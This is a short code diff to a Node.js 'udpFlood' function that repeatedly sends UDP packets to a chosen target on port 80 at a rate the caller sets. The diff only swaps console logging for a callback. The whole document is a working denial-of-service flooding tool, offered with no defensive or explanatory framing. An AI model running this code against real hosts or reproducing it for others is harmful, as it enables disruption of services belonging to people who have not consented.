@@ -1,15 +1,15 @@
 const dgram = require('dgram');
 
-function udpFlood(target, rateLimit) {
+function udpFlood(target, rateLimit, logOutput) {
     const message = new Buffer('flood');
     const client = dgram.createSocket('udp4');
 
     setInterval(() => {
         client.send(message, 0, message.length, 80, target, (err) => {
             if (err) {
-                console.error('Error: ' + err.message);
+                logOutput('Error: ' + err.message);
             } else {
-                console.log('Sent UDP packet');
+                logOutput('Sent UDP packet');
             }
         });
     }, 1000 / rateLimit);
